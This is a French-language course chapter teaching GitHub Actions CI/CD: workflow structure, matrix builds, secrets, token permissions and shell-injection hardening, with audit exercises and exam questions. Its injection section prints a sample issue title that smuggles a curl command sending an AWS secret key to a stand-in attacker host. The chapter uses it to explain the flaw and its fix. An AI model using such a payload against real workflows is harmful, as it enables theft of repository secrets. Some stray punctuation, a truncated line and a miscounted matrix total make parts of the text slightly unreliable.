Chapitre 5 — Automatisation & CI/CD avec GitHub Actions

Module 5 ≈ 2 h 45 de travail Réservé B3 et plus
Mise en situation

Dans les organisations technologiques modernes, le dépôt Git ne se contente plus de stocker du code : il est devenu le moteur central de l’automatisation du cycle de vie logiciel (DevOps). Grâce à GitHub Actions, chaque événement (push, création de Pull Request, publication de release, planification cron) peut déclencher des pipelines d’intégration et de déploiement continus (CI/CD). Cependant, écrire des fichiers de workflow sans maîtrise de la sécurité expose l’entreprise à des risques dévastateurs : exécution de code malveillant via des injections shell non filtrées, vol de secrets de production (clés cloud AWS/Azure) ou fuite de paquets contrefaits. L’ingénieur de niveau Bachelor 3 doit savoir concevoir des workflows performants et scalables avec des stratégies matricielles multi-plateformes, tout en appliquant un durcissement sécuritaire intransigeant.

Objectifs pédagogiques

À la fin de ce chapitre, tu seras capable de :

  1. maîtriser la syntaxe déclarative YAML des workflows GitHub Actions (.github/workflows/) ;
  2. comprendre l’architecture distribuée : événements déclencheurs, jobs parallèles/dépendants et runners hébergés ou auto-hébergés ;
  3. concevoir des matrices d’exécution (strategy.matrix) pour valider le code sur plusieurs systèmes d’exploitation et versions de langages ;
  4. identifier et neutraliser les failles critiques d’injection de commande shell dans les contextes dynamiques ${{ github.event... }} ;
  5. appliquer le principe du moindre privilège aux tokens d’authentification automatiques (GITHUB_TOKEN) via le bloc permissions ;
  6. développer en Python 3 des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.

1. Anatomie d’un Pipeline CI/CD : Workflows, Événements, Jobs & Runners

GitHub Actions est une plateforme d’automatisation intégrée dont la configuration repose sur des fichiers YAML stockés impérativement dans le répertoire .github/workflows/ du dépôt.

Structure Hiérarchique

  • Workflow : Processus automatisé autonome défini dans un fichier .yml.
  • Events (on:) : Événements déclencheurs (ex: push, pull_request, workflow_dispatch, schedule).
  • Jobs : Ensemble d’étapes séquentielles exécutées sur le même environnement. Par défaut, les jobs s’exécutent en parallèle (sauf en cas d’utilisation de needs: pour créer un graphe acyclique de dépendances).
  • Runners (runs-on:) : Machines virtuelles (Ubuntu, Windows, macOS) ou conteneurs exécutant le job.

Étapes & Actions Réutilisables

Chaque job est constitué d’une liste ordonnée de steps :

  • uses: : Invoque une action communautaire ou interne (ex: actions/checkout@v4 pour cloner le code, actions/setup-python@v5 pour installer l’interpréteur).
  • run: : Exécute des commandes en ligne de commande dans le shell natif (bash, sh, powershell).
  • env: : Définit des variables d’environnement locales à l’étape.

2. Stratégie Matricielle (strategy.matrix) : Parallélisation Multi-Axes

Pour tester une bibliothèque sur une multitude de configurations sans dupliquer des dizaines de fichiers de workflow, GitHub Actions propose la stratégie matricielle :

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python-version: ["3.10", "3.11", "3.12"]
        include:
          - os: ubuntu-latest
            python-version: "3.13-dev"
        exclude:
          - os: windows-latest
            python-version: "3.10"
Mécanique du Produit Cartésien & Options Avancées

Le moteur calcule le produit cartésien de tous les axes déclarés : dans l’exemple ci-dessus, $3 \times 3 = 9$ jobs sont instanciés en parallèle, auxquels s’ajoute 1 job spécifique via include: et se soustrait 1 combinaison incompatible via exclude:, soit 9 jobs au total.

,

La directive fail-fast: false est capitale : par défaut (true), dès qu’un job échoue, GitHub annule tous les autres jobs de la matrice. En la fixant à false, on observe le résultat complet sur toutes les plateformes pour diagnostiquer les incompatibilités d’OS.

3. Sécurité des Workflows : Faille Critique d’Injection de Commande Shell

L’erreur de sécurité la plus répandue et la plus destructrice dans GitHub Actions est l’injection directe de variables de contexte dans un script shell (CWE-78 : OS Command Injection).

Anatomie d’une Faille d’Injection dans un bloc run:

Soit le step apparemment anodin suivant réagissant à l’ouverture d’une issue :

,
- name: Verifier titre issue
  run: echo "Nouveau titre : ${{ github.event.issue.title }}"
,

Comme GitHub Actions résout l’expression ${{ ... }} par substitution textuelle brute avant de passer le script au shell bash, un attaquant qui soumet une issue avec le titre suivant :

,
Test"; curl -s https://evil.attacker/exfil?token=$AWS_SECRET_ACCESS_KEY; echo "Fin
,

provoquera l’exécution directe de la commande arbitraire curl dans le runner, exfiltrant les secrets du dépôt !

,

Remédiation obligatoire : Toujours passer les entrées non fiables par des variables d’environnement intermédiaires :

,
- name: Traitement securise
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Nouveau titre : $ISSUE_TITLE"

4. Secrets de Dépôt, Principe du Moindre Privilège & GITHUB_TOKEN

La gestion des identifiants et des accès dans les pipelines d’intégration continue repose sur deux piliers majeurs :

1. Les Secrets GitHub (Encrypted Secrets)

  • Stockés sous forme chiffrée (NaCl box) sur les serveurs GitHub.
  • Accessibles uniquement dans les workflows via ${{ secrets.NOM_SECRET }}.
  • GitHub masque automatiquement (redaction) la valeur du secret dans les logs console en remplaçant la chaîne par ***.

2. Le Token Automatique GITHUB_TOKEN

Généré dynamiquement au début de chaque job et révoqué à la fin. Pour éviter qu’un attaquant exploitant une faille de dépendance n’utilise ce token pour écraser le code du dépôt, on applique le principe du moindre privilège :

permissions:
  contents: read
  issues: write
  pull-requests: read

Tout droit non explicitement mentionné est strictement révoqué.

Exercice 1 — Validateur de structure de workflow GitHub Actions

Étude de cas Niveau 1 — Acquisition

Objectif : Analyser la spécification d’un pipeline GitHub Actions et valider la présence des blocs obligatoires.

Un workflow GitHub Actions (fichier .github/workflows/*.yml) doit respecter une arborescence minimale :

Critères de conformité :
1. name : doit être renseigné (chaîne non vide).
2. Déclencheurs on: : au moins un événement déclencheur parmi push, pull_request, workflow_dispatch, schedule.
3. jobs : au moins un job déclaré. Chaque job doit obligatoirement comporter :
- Une cible d'exécution runs-on (ex: ubuntu-latest, windows-latest).
- Au moins une étape step déclarée.

Analysez les données fournies pour chaque cas...>
JOB id=<id> runs_on=<runner|NONE> steps_count=<n>.

Pour le workflow, afficher :
WORKFLOW_AUDIT name="{nom}" status={VALID | ERREUR} triggers_count={n} jobs_count={m}
Erreurs possibles : MISSING_NAME, MISSING_TRIGGERS, NO_JOBS, JOB_MISSING_RUNS_ON, JOB_ZERO_STEPS.

Cas d’exemple
NAME=CI-Pipeline
TRIGGERS=push,pull_request
JOB id=build runs_on=ubuntu-latest steps_count=3
Résolution attendue
WORKFLOW_AUDIT name="CI-Pipeline" status=VALID triggers_count=2 jobs_count=1

Workflow complet et bien formé.

Deux indices, rédigés en mots
  1. Valider les prérequis dans l’ordre : name, triggers, jobs, puis les contraintes par job.
  2. S’arrêter au premier défaut identifié.

Exercice 2 — Générateur et évaluateur de matrice de build (strategy: matrix)

Étude de cas Niveau 2 — Application

Objectif : Calculer le produit cartésien des axes d’une matrice de test GitHub Actions et gérer les exclusions.

La directive strategy: matrix permet d'exécuter un job en parallèle sur de multiples combinaisons d'environnements (OS x Version de langage).

Spécification :
- Liste d'OS : os=<os1,os2...>.
- Liste de versions de runtime : version=<v1,v2...>.
- Exclusions optionnelles (EXCLUDE os=<os> version=<v>).

Analysez les données fournies pour chaque cas.

Le script doit calculer la liste des combinaisons valides (produit cartésien moins exclusions), triée par OS puis par version, et afficher :
Chaque combinaison :
JOB_INSTANCE os={os} version={v} tag="{os}-{v}"
Et la ligne récapitulative :
MATRIX_TOTAL instances={n} excluded={nb_exclus}

Cas d’exemple
MATRIX_DEF os=ubuntu,macos version=3.11,3.12
EXCLUDE os=macos version=3.11
Résolution attendue
JOB_INSTANCE os=ubuntu version=3.11 tag="ubuntu-3.11"
JOB_INSTANCE os=ubuntu version=3.12 tag="ubuntu-3.12"
JOB_INSTANCE os=macos version=3.12 tag="macos-3.12"
MATRIX_TOTAL instances=3 excluded=1

4 combinaisons initiales moins 1 exclusion = 3 instances exécutées.

Deux indices, rédigés en mots
  1. Générer toutes les paires (o, v) via deux boucles imbriquées.
  2. Filtrer les paires présentes dans l’ensemble des exclusions.

Exercice 3 — Détecteur d’injections de commandes et fuites de secrets dans les Actions

Étude de cas Niveau 3 — Raisonnement

Objectif : Auditer les étapes de scripts GitHub Actions pour détecter les failles d’injection de commande et divulgation de secrets.

Dans GitHub Actions, l’utilisation imprudente d’expressions de contexte dans la directive run: expose le runner à une exécution de code arbitraire (RCE) ou à l'exfiltration de jetons secrets.

Vulnérabilités à détecter :
1. Fuite de secret (Secret Leak) : présence de secrets. ou GITHUB_TOKEN à l'intérieur d'une commande echo ou print.
-> Verdict : VULN_EXPOSED_SECRET.
2. Injection de commande shell : concaténation directe d'entrées utilisateur non fiables au sein de la ligne de commande run:, telles que ${{ github.event.issue.title }}, ${{ github.event.issue.body }}, ${{ github.event.comment.body }}, ${{ github.head_ref }}.
(La bonne pratique est de passer par des variables d'environnement env:).
-> Verdict : VULN_COMMAND_INJECTION.
3. Sinon : étape conforme (SECURE).

Analysez les paramètres du problème pour chaque cas.

Pour chaque étape, afficher :
ACTION_AUDIT step={id} status={SECURE|VULN_EXPOSED_SECRET|VULN_COMMAND_INJECTION}

Cas d’exemple
STEP_INSPECT id=1 cmd=echo "Le titre est ${{ github.event.issue.title }}"
STEP_INSPECT id=2 cmd=echo ${{ secrets.AWS_KEY }}
Résolution attendue
ACTION_AUDIT step=1 status=VULN_COMMAND_INJECTION
ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET

Le step 1 permet l’injection via un titre malveillant, le step 2 fait fuiter la clé AWS.

Deux indices, rédigés en mots
  1. Vérifier d’abord si echo affiche un secret.
  2. Vérifier la présence d’expressions de contexte non assainies dans la commande.

6. QCM — niveau examen

Dans quel sous-dossier exact du dépôt les fichiers de workflow GitHub Actions doivent-ils être impérativement enregistrés ?

GitHub lit exclusivement les fichiers de définition de workflow au format YAML situés dans le répertoire .github/workflows/ à la racine du dépôt.

Quel est le comportement d’exécution par défaut de deux jobs déclarés au même niveau dans un workflow si aucune directive « needs: » n’est précisée ?

Par défaut, tous les jobs d’un workflow sont indépendants et s’exécutent en parallèle, sauf si une dépendance explicite est introduite via le mot-clé needs:.

Pourquoi l’instruction « run: echo "Branche : ${{ github.head_ref }}" » représente-t-elle une vulnérabilité critique ?

L’expression ${{ github.head_ref }} est substituée textuellement avant l’appel du shell : un nom de branche contenant des points-virgules ou guillemets permet d’injecter des commandes malveillantes (Command Injection).

Quelle est la méthode recommandée pour assainir l’utilisation d’un paramètre dynamique issu de l’événement GitHub dans un script shell ?

En passant la valeur via le bloc env: (ex: BRANCH: ${{ github.head_ref }}), le moteur transmet la donnée comme valeur d’environnement et le shell ne tente pas de l’interpréter comme du code exécutable.

Que produit la directive « strategy.matrix » avec os: [ubuntu, windows] et node: [18, 20] ?

strategy.matrix calcule le produit cartésien : 2 systèmes × 2 versions = 4 jobs indépendants exécutés en parallèle.

Que provoque la directive « fail-fast: false » au sein d’une stratégie matricielle ?

Par défaut (fail-fast: true), l’échec d’un job stoppe immédiatement tous les autres. En fixant fail-fast: false, on permet à chaque configuration de mener ses tests à terme pour avoir un diagnostic complet.

Comment restreindre les droits du token d’authentification automatique à la seule lecture du code source dans un workflow ?

Le bloc déclaratif standard permissions: permet de spécifier les scopes autorisés, ici contents: read pour autoriser uniquement la lecture du dépôt.

Pourquoi est-il fortement conseillé d’épingler les actions tierces par leur hash de commit complet (ex: uses: actions/checkout@b4ffde...) ?

Un tag (comme @v4) est une référence modifiable par le propriétaire du dépôt de l’action : un attaquant qui compromettrait ce dépôt pourrait y pousser du code hostile. Le hash SHA immuable garantit l’intégrité absolue.

7. Erreurs classiques — récapitulatif

À reconnaître en examen
  • Écrire ${{ github.head_ref }} ou ${{ github.event... }} directement dans un script bash exécuté dans run:.
  • Laisser les permissions par défaut en lecture/écriture complète pour le GITHUB_TOKEN sur tous les dépôts.
  • Faire un echo d’un secret dans un fichier temporaire qui est ensuite archivé comme artifact public du workflow.
  • Oublier le drapeau fail-fast: false lorsqu’on souhaite obtenir le rapport de test complet sur tous les OS.

8. Méthodologie de résolution

Méthode d’Ingénierie : Durcissement d’un Pipeline CI/CD GitHub Actions
  1. Étape 1 : Structurer le workflow avec les déclencheurs les plus stricts possibles (ex: on: pull_request avec branches: [main]).
  2. Étape 2 : Épingler les actions communautaires avec leur hash de commit SHA complet plutôt qu’un tag mutable (ex: actions/checkout@b4ffde...).
  3. Étape 3 : Restreindre systématiquement les permissions du token d’exécution en tête de fichier via permissions: { contents: read }.
  4. Étape 4 : Scanner tous les blocs run: pour s’assurer qu’aucune expression ${{ github.event... }} n’est insérée directement dans une commande shell.
  5. Étape 5 : Isoler les secrets de déploiement au sein d’Environments GitHub avec règles d’approbation manuelle (Reviewers obligatoires).
  6. Étape 6 : Activer le timeout maximal (timeout-minutes: 15) pour éviter qu’un job bloqué ne consomme tout le quota de l’organisation.

9. Révision active

Résumé essentiel
  • Les workflows GitHub Actions sont déclarés en YAML sous .github/workflows/.
  • Un workflow réagit à des événements (on:), organise des jobs parallèles ou séquentiels (needs:) exécutés sur des runners.
  • strategy.matrix génère le produit cartésien d’axes d’exécution (OS, versions) pour tester en parallèle.
  • fail-fast: false permet de poursuivre les tests sur toutes les configurations même si l’une d’elles échoue.
  • Ne JAMAIS concaténer ${{ github.event... }} dans un run: shell : risque majeur d’injection de commande (CWE-78).
  • Toujours passer les données dynamiques par le bloc env: pour que le shell les traite comme de simples variables textuelles.
  • Configurer systématiquement les permissions du GITHUB_TOKEN selon le principe du moindre privilège.

Checklist de maîtrise

  • Je sais structurer un fichier de workflow valide avec les sections on, jobs et steps.
  • Je comprends la différence entre l’exécution par défaut des jobs en parallèle et séquentielle via needs:.
  • Je sais concevoir une matrice strategy.matrix avec inclusions et exclusions personnalisées.
  • Je sais identifier et corriger une faille d’injection de commande dans un step de workflow.
  • Je sais restreindre les droits d’un workflow avec la directive déclarative permissions:.
  • Je sais utiliser les secrets GitHub sans risque de fuite dans les journaux d’exécution.

  6. Injection de commande shell (CWE-78)
